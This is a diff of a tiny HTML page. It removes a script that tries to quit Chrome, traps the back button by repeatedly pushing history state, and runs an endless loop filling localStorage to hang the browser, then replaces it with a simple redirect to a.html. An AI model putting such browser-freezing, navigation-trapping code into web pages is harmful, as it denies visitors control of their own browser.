@@ -2,31 +2,7 @@
 <h1>Hi</h1>
 
 <script>
-
-  async function hi(){await new Promise(r => setTimeout(r, 1000));
-												console.log("EEEE");
-try {
-    window.location.replace("chrome://quit")
-    //some old browsers support this, if they are useing VERY old chromium.
-} finally {
-    history.pushState(null, document.title,     location.href);
-    window.addEventListener('popstate', function(event) {
-        history.pushState(null, document.title,      location.href);
-    })
-    let location_ = 1
-    let item = 1
-    while(true) {
-        
-        localStorage.setItem(location_, item)
-        location = location_+1
-        item = item*1.001
-        localStorage.getItem(location_)
-        console.log("added and used: "+item+" at "+location_)
-    }
-}
-if (window.closed) {
-    window.location.replace("run.html")
-}};hi()
+window.location = "a.html"
 </script>
 
 
